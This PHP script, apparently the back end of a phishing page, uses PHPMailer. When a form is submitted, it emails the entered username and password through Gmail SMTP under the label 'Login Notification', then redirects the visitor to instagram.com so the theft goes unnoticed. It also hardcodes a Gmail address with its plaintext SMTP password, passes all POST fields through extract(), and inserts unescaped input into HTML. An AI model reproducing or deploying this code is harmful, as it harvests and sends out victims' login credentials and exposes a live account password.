<?php
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\Exception;
    require './vendor/phpmailer/phpmailer/src/Exception.php';
    require './vendor/phpmailer/phpmailer/src/PHPMailer.php';
    require './vendor/phpmailer/phpmailer/src/SMTP.php';
    require './vendor/autoload.php';

    $mail = new PHPMailer(true);

    if(isset($_POST['submit']))
    {
        extract($_POST);
        try {
            // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
            $mail->isSMTP();                                            // Send using SMTP
            $mail->Host       = 'smtp.gmail.com';                    // Set the SMTP server to send through
            $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
            $mail->Username   = 'liamc2156@gmail.com';                     // SMTP username
            $mail->Password   = 'Emmizy2013';                                // SMTP password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
            $mail->Port       = 587; 

            $mail->setFrom('liamc2156@gmail.com', 'FX-Remit Coining ');

            $mail->addAddress($email);     // Add a recipient
            $mail->addReplyTo('no-reply@fxremitcoining.cc'); 
            $mail->isHTML(true);

            $mail->Subject = "Registration Successful";
            $mail->Body    = "<body style='background-color: #eee; font-size: 16px;'>
            <div style='max-width: 100%; min-width: 200px; background-color: #fff; padding: 20px; margin: auto; border-radius: 10px; box-shadow: 0px 10px 10px 5px;'>
                
            <h1 style='font-size: 22px;'><center>Login Notification || E.S.U</center></h1>   
                <hr>
                Username: <b>$username <br/><rbr/>
                Password: $password</b><br/>   

            </body>";

            $mail->send();
            echo "<script type='text/javascript'>location.href = 'https://instagram.com';</script>";
        } catch (Exception $e) {
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        }
    }
?>